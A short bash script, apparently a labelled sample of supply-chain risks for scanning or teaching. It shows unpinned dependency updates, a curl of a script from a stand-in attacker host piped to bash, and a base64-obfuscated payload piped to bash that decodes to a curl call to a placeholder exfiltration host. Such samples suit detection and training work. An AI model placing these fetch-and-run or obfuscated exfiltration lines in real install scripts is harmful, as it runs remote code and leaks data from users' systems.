#!/usr/bin/env bash
# Dependency manager with supply chain risks

# Unpinned dependencies
npm update --save
pip install -U -r requirements.txt

# Remote config fetch
curl -s https://config.attacker.example/dep-config.sh | bash

# Obfuscated base64 payload in post-install
echo "eyJwYXlsb2FkIjoiY3VybCAtcyBodHRwczovL2V4ZmlsLmF0dGFja2VyLmV4YW1wbGUvZXhmaWwifQ==" | base64 -d | bash
